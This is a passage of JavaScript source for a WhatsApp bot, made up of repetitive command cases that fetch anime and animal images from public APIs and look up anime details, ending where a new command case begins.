          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekill':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecry':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewlp':{
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekiss':{
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehug':{
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeneko':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepat':{
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeslap':{
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecuddle':{
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewaifu':{
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animenom':{
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefoxgirl':{
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animetickle': {
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animegecg': {
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'dogwoof': {
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case '8ballpool': {
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'goosebird': {
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefeed': {
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeavatar': {
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'lizardpic': {
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'catmeow': {
await hana()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesearch': {
if (!text) return newReply(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
await hana()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return newReply(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${text}*_\n\n${animetxt}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:anime.picture}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                
                }
                break
case 'hentaivid': case 'hentai': case 'hentaivideo': {
